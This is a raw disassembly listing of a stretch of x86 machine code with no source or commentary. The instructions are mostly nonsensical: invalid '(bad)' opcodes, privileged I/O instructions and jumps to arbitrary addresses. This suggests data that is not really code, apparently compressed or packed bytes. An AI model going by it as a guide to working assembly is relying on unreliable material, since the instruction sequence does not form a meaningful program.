  40a4bb:	inc    ebp
  40a4bc:	push   ds
  40a4bd:	sub    BYTE PTR [esi],dh
  40a4bf:	mov    bl,0x3a
  40a4c1:	adc    DWORD PTR [edx],ecx
  40a4c3:	add    DWORD PTR [ebx],ecx
  40a4c5:	sti    
  40a4c6:	cmovns ebp,DWORD PTR [ebx+ebx*4+0xb6d3dfd]
  40a4ce:	jne    0x40a4ac
  40a4d0:	into   
  40a4d1:	leave  
  40a4d2:	bound  ecx,QWORD PTR [ecx-0x44]
  40a4d5:	daa    
  40a4d6:	cmp    ebp,DWORD PTR cs:[edx+0x41]
  40a4da:	cmc    
  40a4db:	add    edi,DWORD PTR [ebx]
  40a4dd:	add    eax,0x9328ef0c
  40a4e2:	xchg   esi,eax
  40a4e3:	jmp    0xca981c64
  40a4e8:	data16 daa 
  40a4ea:	mov    edi,0x849bba0
  40a4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4f0:	mov    es,WORD PTR ds:[ebp-0x4fe68e0a]
  40a4f7:	(bad)  
  40a4f8:	sar    ecx,cl
  40a4fa:	imul   ebx,DWORD PTR [edi],0xffffffc9
  40a4fd:	(bad)  ds:0xc94e7557
  40a503:	jne    0x40a554
  40a505:	pop    edx
  40a506:	lahf   
  40a507:	dec    edi
  40a508:	cmp    eax,0x1ca8fb17
  40a50d:	mov    ss,WORD PTR [ebp+0x29]
  40a510:	and    cl,BYTE PTR [ecx+0x11ea00d2]
  40a516:	sub    BYTE PTR ds:0xdff16772,bh
  40a51c:	adc    al,0x69
  40a51e:	xor    BYTE PTR [eax],cl
  40a520:	rcr    BYTE PTR [ecx],0x4f
  40a523:	arpl   WORD PTR [ebp+0x23],di
  40a526:	aam    0x8e
  40a528:	xor    DWORD PTR [ecx-0x13da65d3],0x5cc6e900
  40a532:	push   0x37
  40a534:	xchg   DWORD PTR [esi-0x63],edi
  40a537:	inc    eax
  40a538:	ror    DWORD PTR [eax],cl
  40a53a:	in     al,0xe6
  40a53c:	cmp    al,0x81
  40a53e:	ds jp  0x40a4f2
  40a541:	rcr    BYTE PTR [edx],cl
  40a543:	das    
  40a544:	pop    ss
  40a545:	pop    ds
  40a546:	in     al,dx
  40a547:	scas   al,BYTE PTR es:[edi]
  40a548:	xchg   DWORD PTR [edx+0x3a23aa00],eax
  40a54e:	inc    ebp
  40a54f:	stc    
  40a550:	push   ebx
  40a551:	push   esp
  40a552:	neg    dh
  40a554:	xlat   BYTE PTR ds:[ebx]
  40a555:	dec    edi
  40a556:	call   0x9b001e69
  40a55b:	push   cs
  40a55c:	or     BYTE PTR [ebx],bl
  40a55e:	(bad)  
  40a55f:	jbe    0x40a511
  40a561:	push   esi
  40a562:	(bad)  
  40a563:	repnz aas 
  40a565:	mov    al,0xa7
  40a567:	scas   al,BYTE PTR es:[edi]
  40a568:	push   esi
  40a569:	in     al,dx
  40a56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a56b:	je     0x40a5c5
  40a56d:	rol    DWORD PTR [edx],0xe3
  40a570:	imul   esp,DWORD PTR [eax],0x5fd82118
  40a576:	cmp    al,0xf
  40a578:	inc    ebp
  40a579:	pusha  
  40a57a:	xchg   edi,eax
  40a57b:	mov    dh,0x5c
  40a57d:	hlt    
  40a57e:	pop    ds
  40a57f:	or     DWORD PTR [edx+0x23eff08f],esi
  40a585:	pop    eax
  40a586:	ror    esp,0xb4
  40a589:	in     eax,0x3f
  40a58b:	jae    0x40a581
  40a58d:	(bad)  
  40a58e:	push   edx
  40a58f:	shl    BYTE PTR [ecx],0x18
  40a592:	jo     0x40a54d
  40a594:	pop    edx
  40a595:	adc    ebp,ebp
  40a597:	lods   al,BYTE PTR ds:[esi]
  40a598:	pop    ss
  40a599:	pop    esp
  40a59a:	mov    edi,0xdba9477
  40a59f:	cwde   
  40a5a0:	das    
  40a5a1:	mov    ebx,0x55e7bcfc
  40a5a6:	jae    0x40a605
  40a5a8:	in     eax,0x6
  40a5aa:	adc    edx,DWORD PTR [ebx+ecx*2]
  40a5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ae:	(bad)  
  40a5af:	push   edi
  40a5b0:	repz pop edx
  40a5b2:	dec    eax
  40a5b3:	(bad)  
  40a5b4:	lds    esi,FWORD PTR [ebx+0x41687fe1]
  40a5ba:	push   edi
  40a5bb:	inc    edi
  40a5bc:	ss ret 0xc8cb
  40a5c0:	dec    esi
  40a5c1:	popa   
  40a5c2:	lds    ebp,FWORD PTR [ecx+esi*4+0x44]
  40a5c6:	fwait
  40a5c7:	cmp    eax,0x384078ec
  40a5cc:	push   edi
  40a5cd:	push   0x5a0c3cd5
  40a5d2:	gs pusha 
  40a5d4:	xchg   BYTE PTR [edi-0x59],bl
  40a5d7:	jecxz  0x40a629
  40a5d9:	pop    edi
  40a5da:	lahf   
  40a5db:	fisubr DWORD PTR [ebp+0x173e1603]
  40a5e1:	push   es
  40a5e2:	cmp    DWORD PTR [edx+0x37],ecx
  40a5e5:	bound  ebp,QWORD PTR [ebx+0x1408a545]
  40a5eb:	shr    DWORD PTR es:[eax-0x3e],0x2c
  40a5f0:	loope  0x40a60d
  40a5f2:	ficom  WORD PTR [ecx+0x4e]
  40a5f5:	adc    ah,al
  40a5f7:	xchg   edx,eax
  40a5f8:	popf   
  40a5f9:	mov    ah,0xd3
  40a5fb:	inc    esi
  40a5fc:	adc    BYTE PTR [ecx],dh
  40a5fe:	add    eax,0x56530a6
  40a603:	or     DWORD PTR fs:[edi],ebx
  40a606:	sbb    BYTE PTR [edx-0x24],dh
  40a609:	or     BYTE PTR [ebp+0x20],0x22
  40a60d:	neg    DWORD PTR [esi]
  40a60f:	enter  0x88bb,0x0
  40a613:	sbb    edi,edx
  40a615:	fist   WORD PTR [ebp+0x47]
  40a618:	out    0xcb,al
  40a61a:	in     al,dx
  40a61b:	push   eax
  40a61c:	mov    edi,0x44e2f156
  40a621:	jmp    0x5b900d68
  40a626:	fbstp  TBYTE PTR [ecx-0x4e12b564]
  40a62c:	test   BYTE PTR [ebx-0x2a782fb4],al
  40a632:	or     DWORD PTR [ecx+0x561ae31f],ebp
  40a638:	clc    
  40a639:	adc    ch,BYTE PTR [ecx]
  40a63b:	and    ecx,DWORD PTR [eax-0x7748a670]
  40a641:	sbb    al,0xc9
  40a643:	shr    BYTE PTR [edx+edx*8-0x37f94c30],0xdd
  40a64b:	aaa    
  40a64c:	mov    ds:0x964023ff,al
  40a651:	pop    ebp
  40a652:	adc    eax,ebp
  40a654:	mov    esp,0x8c253695
  40a659:	dec    edx
  40a65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a65b:	(bad)  
  40a65c:	retf   
  40a65d:	mov    esp,0x5aec3944
  40a662:	push   esp
  40a663:	xor    eax,0xb839e14c
  40a668:	adc    bl,cl
  40a66a:	retf   
  40a66b:	xor    eax,eax
  40a66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66e:	shr    DWORD PTR [edi+0x70],cl
  40a671:	das    
  40a672:	dec    eax
  40a673:	xchg   ecx,eax
  40a674:	add    DWORD PTR [esp+ebp*4+0x36],0xffffffc9
  40a679:	in     al,0x6c
  40a67b:	cmp    BYTE PTR [ebx+eiz*8-0x6757ffd],dh
  40a682:	mov    bl,0xa
  40a684:	dec    eax
  40a685:	test   al,0x63
  40a687:	imul   eax,DWORD PTR [edx+edi*8-0x10],0x2728f5a0
  40a68f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a690:	aad    0x7b
  40a692:	imul   ebx,DWORD PTR [ecx],0x43
  40a695:	mov    esi,0xd63b8586
  40a69a:	popa   
  40a69b:	pop    eax
  40a69c:	push   edi
  40a69d:	icebp  
  40a69e:	push   edi
  40a69f:	xchg   ecx,eax
  40a6a0:	loop   0x40a716
  40a6a2:	fucomp st(6)
  40a6a4:	out    dx,al
  40a6a5:	sbb    cl,dl
  40a6a7:	lds    ebp,FWORD PTR [edx-0x38]
  40a6aa:	rcl    eax,cl
  40a6ac:	mov    ds:0xe9c50cd,eax
  40a6b1:	addr16 mov edx,0xbef2dbbd
  40a6b7:	xchg   ebp,eax
  40a6b8:	sub    dh,BYTE PTR [ebp+0x7fe1468]
  40a6be:	mov    fs,esi
  40a6c0:	(bad)  
  40a6c1:	(bad)  [edi+0x35613c66]
  40a6c7:	(bad)  
  40a6c8:	adc    DWORD PTR [eax+0x3d],ecx
  40a6cb:	add    al,0xd8
  40a6cd:	mov    eax,0x171798ef
  40a6d2:	adc    edi,DWORD PTR gs:[edi-0x79c5488c]
  40a6d9:	imul   esi,eax,0xfa540411
  40a6df:	sbb    eax,0xbf2f14e2
  40a6e4:	dec    esi
  40a6e5:	xchg   esi,eax
  40a6e6:	(bad)  
  40a6e7:	inc    esi
  40a6e8:	push   cs
  40a6e9:	jno    0x40a758
  40a6eb:	xchg   cl,ch
  40a6ed:	mov    ebx,0x9d56caae
  40a6f2:	pop    es
  40a6f3:	mov    bh,0x66
  40a6f5:	sbb    al,BYTE PTR [eax-0x1048a56c]
  40a6fb:	adc    eax,0xdaaa0e0f
  40a700:	popa   
  40a701:	add    ebx,DWORD PTR [edx]
  40a703:	xchg   edx,eax
  40a704:	fiadd  DWORD PTR [ebx]
  40a706:	or     al,0x96
  40a708:	mov    esp,0x18c79fc0
  40a70d:	push   edx
  40a70e:	mov    eax,ds:0xc28c0a6a
  40a713:	popf   
  40a714:	xchg   ebx,eax
  40a715:	clc    
  40a716:	push   esp
  40a717:	push   0x3c830377
  40a71c:	rol    eax,cl
  40a71e:	(bad)  
  40a71f:	jo     0x40a790
  40a721:	xchg   edi,eax
  40a722:	xor    DWORD PTR [esi+0x48b5be5b],edx
  40a728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a729:	sub    BYTE PTR [ecx-0x3bac1f14],cl
  40a72f:	mov    esp,0xe01d95bb
  40a734:	add    ebp,ebx
  40a736:	cmp    eax,0xd961ec8
  40a73b:	shl    DWORD PTR [ebx+0x60],cl
  40a73e:	jge    0x40a744
  40a740:	mov    WORD PTR [esi-0x40],?
  40a743:	loop   0x40a6e9
  40a745:	cwde   
  40a746:	add    esp,DWORD PTR [eax+edx*8-0x128773e9]
  40a74d:	xor    DWORD PTR [edx+0x660409a9],0xd801bedd
  40a757:	xor    DWORD PTR [eax],esi
  40a759:	sbb    eax,0x606620da
  40a75e:	bound  sp,DWORD PTR ds:0xc23d10f7
  40a765:	xor    al,BYTE PTR [edx+ebp*4+0x283d0c2f]
  40a76c:	fistp  QWORD PTR [ebp+ebx*2+0x6f94a1e0]
  40a773:	and    DWORD PTR [eax+0x736863],esi
  40a779:	outs   dx,BYTE PTR ds:[esi]
  40a77a:	inc    edi
  40a77b:	popa   
  40a77c:	or     eax,0x2fe71ea3
  40a781:	rcl    cl,0xd2
  40a784:	or     al,cl
  40a786:	jbe    0x40a79b
  40a788:	lods   eax,DWORD PTR ds:[esi]
  40a789:	mov    edx,0x8f50b5a2
  40a78e:	mov    al,0x52
  40a790:	cmc    
  40a791:	scas   al,BYTE PTR es:[edi]
  40a792:	or     al,0x10
  40a794:	out    0xe6,eax
  40a796:	xchg   esi,eax
  40a797:	dec    esi
  40a798:	jle    0x40a7d3
  40a79a:	inc    esi
  40a79b:	dec    edx
  40a79c:	push   ecx
  40a79d:	pop    edx
  40a79e:	push   eax
  40a79f:	push   ebx
  40a7a0:	cmc    
  40a7a1:	repz mov ebx,0x62f81003
  40a7a7:	call   0xae86:0x8a351117
  40a7ae:	lea    edi,[edx-0x4e]
  40a7b1:	sar    DWORD PTR [ecx-0x59903ef4],0xe5
  40a7b8:	stc    
  40a7b9:	xor    dl,dh
  40a7bb:	adc    ah,bl
  40a7bd:	pop    edx
  40a7be:	jmp    0x40a7f9
  40a7c0:	sbb    cl,dh
  40a7c2:	je     0x40a794
  40a7c4:	js     0x40a77d
  40a7c6:	je     0x40a7f9
  40a7c8:	call   0x52c8b74a
  40a7cd:	gs add ah,bh
  40a7d0:	jne    0x40a820
  40a7d2:	clc    
  40a7d3:	imul   esp,DWORD PTR [edx+0x4d],0xd623d260
  40a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7db:	in     eax,0x16
  40a7dd:	push   edx
  40a7de:	add    ebp,esp
  40a7e0:	data16 fldl2e 
  40a7e3:	and    eax,0xa56cf652
  40a7e8:	in     eax,dx
  40a7e9:	or     al,0x4f
  40a7eb:	shl    DWORD PTR ss:[ecx-0x7e],cl
  40a7ef:	sub    eax,ebp
  40a7f1:	push   ss
  40a7f2:	stos   DWORD PTR es:[edi],eax
  40a7f3:	test   eax,0x9ac15d94
  40a7f8:	sti    
  40a7f9:	xchg   ebp,eax
  40a7fa:	jo     0x40a784
  40a7fc:	test   BYTE PTR [edi+esi*4-0x46],bl
  40a800:	loopne 0x40a7bc
  40a802:	fdivr  st,st(1)
  40a804:	or     eax,0xa14411e1
  40a809:	call   0xb266c8f6
  40a80e:	or     eax,0xcf151951
  40a813:	add    BYTE PTR [ebx-0x6c],0xff
  40a817:	sbb    dh,0xb7
  40a81a:	gs ss out dx,eax
  40a81d:	scas   al,BYTE PTR es:[edi]
  40a81e:	shld   edi,edx,cl
  40a821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a822:	dec    ebx
  40a823:	cmp    eax,0xfb65747
  40a828:	xchg   ecx,eax
  40a829:	xchg   ah,al
  40a82b:	pop    ss
  40a82c:	dec    esi
  40a82d:	pop    ss
  40a82e:	pop    ebp
  40a82f:	jge    0x40a857
  40a831:	inc    edx
  40a832:	dec    DWORD PTR [edi+0x426b70c6]
  40a838:	in     al,0xb6
  40a83a:	or     dl,cl
  40a83c:	mov    al,ds:0x2b9631a1
  40a841:	cmp    al,0x56
  40a843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a844:	(bad)  
  40a845:	fidiv  DWORD PTR [eax]
  40a847:	ins    DWORD PTR es:[edi],dx
  40a848:	mov    dh,BYTE PTR [esi-0x39a99b11]
  40a84e:	hlt    
  40a84f:	cli    
  40a850:	xchg   ecx,ebx
  40a852:	shr    ch,cl
  40a854:	xchg   BYTE PTR [ebx-0x29],al
  40a857:	dec    esp
  40a858:	sbb    bh,BYTE PTR [edi-0xf]
  40a85b:	dec    BYTE PTR [edi+0x230aebb]
  40a861:	adc    eax,0x44316c73
  40a866:	stos   WORD PTR es:[edi],ax
  40a868:	xchg   ecx,eax
  40a869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86a:	jecxz  0x40a8c5
  40a86c:	mov    es,WORD PTR [ecx+0x2e4766f0]
  40a872:	mov    ds:0xfb0d022b,eax
  40a877:	mov    esi,0xea583a98
  40a87c:	dec    esp
  40a87d:	push   esp
  40a87e:	sar    ebp,1
  40a880:	jle    0x40a821
  40a882:	aad    0x71
  40a884:	jbe    0x40a814
  40a886:	inc    ecx
  40a887:	(bad)  
  40a888:	mov    ebx,0x5d8e4329
  40a88d:	push   ebx
  40a88e:	add    al,al
  40a890:	sub    bh,BYTE PTR [esi-0x50]
  40a893:	sub    al,0x84
  40a895:	stc    
  40a896:	lea    ebx,[ebx+0x4bb1f5e5]
  40a89c:	and    DWORD PTR [eax-0x3e],ebx
  40a89f:	sub    BYTE PTR [edi-0x153aa9e0],dh
  40a8a5:	mov    ch,0x54
  40a8a7:	pop    es
  40a8a8:	sub    al,0xb5
  40a8aa:	mov    ch,0x6e
  40a8ac:	cs pushf 
  40a8ae:	retf   0xcc73
  40a8b1:	lds    esi,FWORD PTR [esi-0x32]
  40a8b4:	in     al,0x82
  40a8b6:	ins    DWORD PTR es:[edi],dx
  40a8b7:	and    DWORD PTR [ebx-0x36f1e37d],esi
  40a8bd:	lahf   
  40a8be:	ffreep st(1)
  40a8c0:	or     ah,BYTE PTR [ebx+0x4e91ef43]
  40a8c6:	jbe    0x40a8b0
  40a8c8:	add    al,0xfe
  40a8ca:	sbb    ah,BYTE PTR [eax+0x60]
  40a8cd:	rdmsr  
  40a8cf:	iret   
  40a8d0:	or     ah,BYTE PTR ss:[ebx]
  40a8d3:	xchg   esp,eax
  40a8d4:	dec    esp
  40a8d5:	or     BYTE PTR [edi+0x2d],0x17
  40a8d9:	pusha  
  40a8da:	sub    BYTE PTR [ebx-0x44],0xf
  40a8de:	(bad)  
  40a8df:	ret    0x3012
  40a8e2:	inc    edi
  40a8e3:	in     al,0xe
  40a8e5:	cmp    DWORD PTR ss:[ebp-0x3a454751],0x53
  40a8ed:	test   al,0xdb
  40a8ef:	sub    BYTE PTR [eax-0x6f5fdebb],cl
  40a8f5:	jnp    0x40a973
  40a8f7:	ret    0x2c51
  40a8fa:	imul   eax,DWORD PTR [ecx],0xffffffd5
  40a8fd:	push   0x953373a9
  40a902:	jne    0x40a8cf
  40a904:	sti    
  40a905:	jmp    FWORD PTR [edi-0x33]
  40a908:	loope  0x40a8dd
  40a90a:	leave  
  40a90b:	jae    0x40a89a
  40a90d:	lea    esi,[edx+0x3c6d0199]
  40a913:	pop    ecx
  40a914:	test   al,0x40
  40a916:	popa   
  40a917:	lahf   
  40a918:	add    DWORD PTR [edi],0xffffffb3
  40a91b:	std    
  40a91c:	mov    ds:0x354619f8,al
  40a921:	and    al,bl
  40a923:	push   ebx
  40a924:	mov    eax,ds:0xa48bd5b7
  40a929:	ror    BYTE PTR [edx+0x63],1
  40a92c:	iret   
  40a92d:	xor    BYTE PTR [eax],bl
  40a92f:	or     DWORD PTR [ecx],edi
  40a931:	jp     0x40a8ba
  40a933:	imul   edx,DWORD PTR [ebp-0x41adf3ee],0xfafc7174
  40a93d:	pusha  
  40a93e:	daa    
  40a93f:	fisubr WORD PTR [esp+ecx*1+0x15d343fb]
  40a946:	fstp   DWORD PTR ds:0x13459b68
  40a94c:	pop    ebx
  40a94d:	jp     0x40a8fe
  40a94f:	jle    0x40a92d
  40a951:	jbe    0x40a915
  40a953:	jl     0x40a985
  40a955:	aam    0xf0
  40a957:	scas   eax,DWORD PTR es:[edi]
  40a958:	mov    ah,BYTE PTR [ebx]
  40a95a:	xchg   esi,eax
  40a95b:	das    
  40a95c:	call   0x7b5163f3
  40a961:	xchg   ecx,eax
  40a962:	test   al,0xf7
  40a964:	push   ds
  40a965:	cmp    ch,bh
  40a967:	popa   
  40a968:	cmp    al,dh
  40a96a:	sub    DWORD PTR [esp+esi*1+0x5d],eax
  40a96e:	shr    esi,0x2c
  40a971:	jmp    0x40a932
  40a973:	in     eax,dx
  40a974:	scas   eax,DWORD PTR es:[edi]
  40a975:	jge    0x40a983
  40a977:	enter  0x5d37,0xa2
  40a97b:	(bad)  
  40a97c:	jle    0x40a9b4
  40a97e:	in     eax,dx
  40a97f:	icebp  
  40a980:	add    DWORD PTR [edx],ecx
  40a982:	mov    al,ds:0x8dff9e28
  40a987:	mov    sp,0xf4a0
  40a98b:	mov    ah,0xad
  40a98d:	(bad)  
  40a98e:	push   eax
  40a98f:	sbb    esp,DWORD PTR [edx-0x6fdf00c5]
  40a995:	(bad)  
  40a996:	mov    esi,0x5e4c3cc5
  40a99b:	nop
  40a99c:	scas   al,BYTE PTR es:[edi]
  40a99d:	lahf   
  40a99e:	test   eax,0xd32629d
  40a9a3:	ja     0x40a9e6
  40a9a5:	jae    0x40a960
  40a9a7:	or     al,0xef
  40a9a9:	in     al,dx
  40a9aa:	bound  ecx,QWORD PTR [esi]
  40a9ac:	pop    esi
  40a9ad:	mov    ecx,0xa7e3eef8
  40a9b2:	bound  eax,QWORD PTR [esp+esi*4-0xb2d4c3d]
  40a9b9:	fistp  WORD PTR ds:0x68626f19
  40a9bf:	adc    edi,0x3c
  40a9c2:	jmp    0x7811:0xc00c0991
  40a9c9:	dec    esp
  40a9ca:	push   es
  40a9cb:	jp     0x40aa21
  40a9cd:	xor    eax,0x41255c17
  40a9d2:	and    eax,0x389ddc99
  40a9d7:	mov    ch,0x7f
  40a9d9:	pop    esp
  40a9da:	mov    ecx,DWORD PTR [eax+0x87c7e28]
  40a9e0:	fist   DWORD PTR [ecx+0x79ac73a8]
  40a9e6:	test   DWORD PTR [edx-0x6a],ebx
  40a9e9:	das    
  40a9ea:	shr    BYTE PTR [eax+0x14],1
  40a9ed:	daa    
  40a9ee:	les    ecx,FWORD PTR [esi]
  40a9f0:	test   DWORD PTR [ecx+ebp*1],esi
  40a9f3:	fcom   DWORD PTR [eax+0x2b]
  40a9f6:	pusha  
  40a9f7:	imul   esi,esp,0x346432
  40a9fd:	sub    al,0xe0
  40a9ff:	jae    0x40a9be
  40aa01:	lods   eax,DWORD PTR ds:[esi]
  40aa02:	es xor ch,al
  40aa05:	push   es
  40aa06:	cmp    eax,ebx
  40aa08:	sub    eax,0x88f3c199
  40aa0d:	jecxz  0x40aa57
  40aa0f:	icebp  
  40aa10:	xor    BYTE PTR [ecx+ebp*8+0x3029421],ah
  40aa17:	das    
  40aa18:	pop    ss
  40aa19:	std    
  40aa1a:	repnz or BYTE PTR [edi+eax*8],ah
  40aa1e:	adc    BYTE PTR [eax],dl
  40aa20:	div    DWORD PTR [esp+ebx*4+0x6f]
  40aa24:	rcr    BYTE PTR [edx+edx*8],1
  40aa27:	in     al,dx
  40aa28:	and    bl,BYTE PTR [esi-0x5f92f129]
  40aa2e:	cmp    dl,BYTE PTR ds:0xe13a56e4
  40aa34:	enter  0x520e,0xa2
  40aa38:	scas   al,BYTE PTR es:[edi]
  40aa39:	repnz xor al,0xe6
  40aa3c:	call   0xaec1:0xd908f193
  40aa43:	imul   BYTE PTR [esi]
  40aa45:	mov    al,0xf8
  40aa47:	fdivr  QWORD PTR [ecx-0x2641260d]
  40aa4d:	xor    ecx,DWORD PTR [esi*2+0x5aba24bb]
  40aa54:	fsubr  DWORD PTR [ecx+0x72b9430e]
  40aa5a:	or     esp,DWORD PTR [ebx]
  40aa5c:	pop    ebx
  40aa5d:	fidivr DWORD PTR [ecx-0x4f6881c0]
  40aa63:	xchg   cl,bl
  40aa65:	jo     0x40aa0a
  40aa67:	mov    ebx,0x2f212f1d
  40aa6c:	fld    st(6)
  40aa6e:	mov    bl,0x2
  40aa70:	sub    eax,0x6b1ca161
  40aa75:	ja     0x40aadb
  40aa77:	or     BYTE PTR [esi],bl
  40aa79:	(bad)  
  40aa7a:	pop    es
  40aa7b:	xor    DWORD PTR [ebx-0x1a],ebp
  40aa7e:	mov    ds:0xbf613807,eax
  40aa83:	pop    edx
  40aa84:	mov    ds:0x1a195657,al
  40aa89:	(bad)  
  40aa8a:	cli    
  40aa8b:	adc    DWORD PTR [eax+0x601fc4e4],ebx
  40aa91:	mov    al,ds:0x88d6c31a
  40aa96:	loop   0x40aa51
  40aa98:	lods   al,BYTE PTR ds:[esi]
  40aa99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa9a:	fwait
  40aa9b:	mov    cl,0x3f
  40aa9d:	jo     0x40ab18
  40aa9f:	test   DWORD PTR [esi+ebx*4],edx
  40aaa2:	lods   eax,DWORD PTR ds:[esi]
  40aaa3:	ins    DWORD PTR es:[edi],dx
  40aaa4:	shl    DWORD PTR [edi+0x59],cl
  40aaa7:	fild   DWORD PTR [ebx+0x7f8c7a7f]
  40aaad:	jg     0x40aac5
  40aaaf:	loopne 0x40aa7e
  40aab1:	jb     0x40aa54
  40aab3:	and    eax,0x56e6fec6
  40aab8:	je     0x40aa4d
  40aaba:	sahf   
  40aabb:	mov    ds:0xd59dec0b,eax
  40aac0:	adc    ebx,DWORD PTR [edx+0x50]
  40aac3:	repz mov esp,0x20d4b93a
  40aac9:	sbb    ebp,DWORD PTR [edx]
  40aacb:	mov    al,0x45
  40aacd:	mov    esi,0xeb3e8d74
  40aad2:	or     dh,BYTE PTR [ebx+eiz*1-0xe]
  40aad6:	adc    DWORD PTR [esi+0x704d5da3],esi
  40aadc:	and    ebp,DWORD PTR [ecx]
  40aade:	sti    
  40aadf:	rol    BYTE PTR [esi-0x5],cl
  40aae2:	or     ah,dl
  40aae4:	mov    bh,BYTE PTR [ebx-0x6d]
  40aae7:	out    dx,al
  40aae8:	push   ebx
  40aae9:	mov    cl,0x2e
  40aaeb:	push   edi
  40aaec:	push   edx
  40aaed:	jp     0x40ab17
  40aaef:	mov    bl,0xc4
  40aaf1:	lds    ebp,FWORD PTR [ecx]
  40aaf3:	aam    0xe2
  40aaf5:	adc    DWORD PTR [ecx+0x6e],esi
  40aaf8:	xchg   al,cl
  40aafa:	popa   
  40aafb:	and    DWORD PTR [bx+si],edi
  40aafe:	cwde   
  40aaff:	xchg   DWORD PTR [ebx],ebx
  40ab01:	push   ebx
  40ab02:	sub    BYTE PTR [eax-0x70ea914e],0x1f
  40ab09:	lahf   
  40ab0a:	sbb    al,0xdb
  40ab0c:	call   0x85ec77c2
  40ab11:	mov    ebx,0xbd54b626
  40ab16:	pop    esi
  40ab17:	not    BYTE PTR [ebp-0x40aec14e]
  40ab1d:	cmp    al,0xe
  40ab1f:	xchg   esi,eax
  40ab20:	lds    edx,FWORD PTR [edx-0x1ccbf8ec]
  40ab26:	mov    dh,dh
  40ab28:	jne    0x40ab6a
  40ab2a:	and    eax,0xad67fd6a
  40ab2f:	push   es
  40ab30:	dec    ebp
  40ab31:	sbb    BYTE PTR [ebx],ah
  40ab33:	jbe    0x40aaed
  40ab35:	push   ss
  40ab36:	jmp    DWORD PTR [edi+0x31]
  40ab39:	sti    
  40ab3a:	ds jno 0x40ab1c
  40ab3d:	(bad)  [edi-0x6d]
  40ab40:	shl    BYTE PTR [edi+0x3e],0x77
  40ab44:	jle    0x40aae4
  40ab46:	std    
  40ab47:	int    0x3
  40ab49:	bound  esp,QWORD PTR [eax]
  40ab4b:	outs   dx,DWORD PTR ds:[esi]
  40ab4c:	mov    WORD PTR [edi-0x4b7d30de],es
  40ab52:	cdq    
  40ab53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab54:	pop    es
  40ab55:	and    bl,al
  40ab57:	xor    BYTE PTR [edx+edi*2],dl
  40ab5a:	cli    
  40ab5b:	jns    0x40aba7
  40ab5d:	fdivr  QWORD PTR [ecx]
  40ab5f:	or     dh,cl
  40ab61:	imul   ecx,eax,0xa5809d92
  40ab67:	push   ds
  40ab68:	mov    dh,0x27
  40ab6a:	mov    esp,0xb0ec31ce
  40ab6f:	int    0xef
  40ab71:	inc    edx
  40ab72:	sar    DWORD PTR [eax],0x6d
  40ab75:	xchg   BYTE PTR [edi+0x3b],cl
  40ab78:	daa    
  40ab79:	stc    
  40ab7a:	retf   0xc777
  40ab7d:	lock mov ds:0x2b3758b8,eax
  40ab83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab84:	cwde   
  40ab85:	sub    dh,BYTE PTR [edx-0x42ccd31d]
  40ab8b:	repz sub al,0xf4
  40ab8e:	popa   
  40ab8f:	mov    cl,0x58
  40ab91:	adc    edi,ecx
  40ab93:	add    ebp,esp
  40ab95:	xchg   esi,eax
  40ab96:	inc    eax
  40ab97:	jg     0x40ab25
  40ab99:	leave  
  40ab9a:	repz jecxz 0x40abaf
  40ab9d:	leave  
  40ab9e:	mov    al,0x8b
  40aba0:	push   DWORD PTR [ecx-0x6f0c4359]
  40aba6:	add    al,0xa2
  40aba8:	int    0x6b
  40abaa:	cdq    
  40abab:	and    al,0x8
  40abad:	push   ds
  40abae:	inc    ecx
  40abaf:	add    al,0xe2
  40abb1:	ret    0x82f0
  40abb4:	mov    WORD PTR [ecx-0x103a2ba4],gs
  40abba:	pop    es
  40abbb:	jae    0x40ab44
  40abbd:	inc    esi
  40abbe:	mov    edx,0x6746d96d
  40abc3:	jb     0x40abae
  40abc5:	adc    eax,0x9e830de7
  40abca:	ja     0x40ab62
  40abcc:	bound  ebx,QWORD PTR [ecx+0x70]
  40abcf:	mov    dl,0xde
  40abd1:	mov    ds:0xc27b296d,eax
  40abd6:	ja     0x40abfe
  40abd8:	cmp    ecx,DWORD PTR [edx+0x549213b9]
  40abde:	xor    al,0x52
  40abe0:	gs iret 
  40abe2:	mov    al,BYTE PTR [edx-0x18]
  40abe5:	dec    esp
  40abe6:	lods   eax,DWORD PTR ds:[esi]
  40abe7:	cs jmp 0x40aba9
  40abea:	lods   eax,DWORD PTR ds:[esi]
  40abeb:	push   eax
  40abec:	test   eax,0x6ddac6a0
  40abf1:	call   0x1daa:0x87f85560
  40abf8:	ja     0x40abff
  40abfa:	dec    ecx
  40abfb:	les    ecx,FWORD PTR [ebx+0x13b51421]
  40ac01:	jae    0x40ac4b
  40ac03:	pop    ebx
  40ac04:	inc    ebx
  40ac05:	dec    esp
  40ac06:	fsub   DWORD PTR [ecx-0x41]
  40ac09:	xchg   edi,edi
  40ac0b:	dec    eax
  40ac0c:	dec    edi
  40ac0d:	xor    bl,BYTE PTR [ebx+0x2e]
  40ac10:	ficom  WORD PTR ss:[eax+ebx*8+0x50]
  40ac15:	push   cs
  40ac16:	(bad)  
  40ac17:	jp     0x40abaa
  40ac19:	das    
  40ac1a:	cld    
  40ac1b:	xchg   esp,eax
  40ac1c:	xor    bh,ch
  40ac1e:	mov    al,0x3a
  40ac20:	fld    DWORD PTR [edi+0xc997ec8]
  40ac26:	jg     0x40ac7e
  40ac28:	out    dx,al
  40ac29:	push   edx
  40ac2a:	jnp    0x40abf1
  40ac2c:	mov    dl,0xe
  40ac2e:	sti    
  40ac2f:	pop    eax
  40ac30:	int    0xba
  40ac32:	(bad)  
  40ac33:	lods   eax,DWORD PTR ds:[esi]
  40ac34:	ror    DWORD PTR [ebx-0x385e1091],1
  40ac3a:	mov    ebx,eax
  40ac3c:	retf   
  40ac3d:	daa    
  40ac3e:	mov    al,ds:0xf38a82c4
  40ac43:	out    0x46,eax
